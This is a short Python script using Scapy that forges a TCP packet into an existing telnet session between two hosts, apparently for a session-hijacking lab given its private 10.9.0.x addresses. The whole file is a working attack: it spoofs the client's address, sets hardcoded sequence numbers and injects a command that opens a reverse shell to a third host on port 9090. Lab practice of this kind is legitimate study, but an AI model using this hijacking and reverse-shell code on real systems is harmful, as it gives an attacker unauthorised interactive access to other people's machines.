#!/usr/bin/env python3
from scapy.all import *
import time


def startHijacking():
    print("Starting hijacking....")
    ip  = IP(src="10.9.0.6", dst="10.9.0.5")
    tcp = TCP(sport=39538, dport=23, flags="A", seq=676244289, ack=689861818)
    data = "\n/bin/sh -i > /dev/tcp/10.9.0.1/9090 2>&1 0<&1\n"
    pkt = ip/tcp/data
    ls(pkt)
    print("I am in....")
    send(pkt, verbose=0)
    exit(0)

startHijacking()
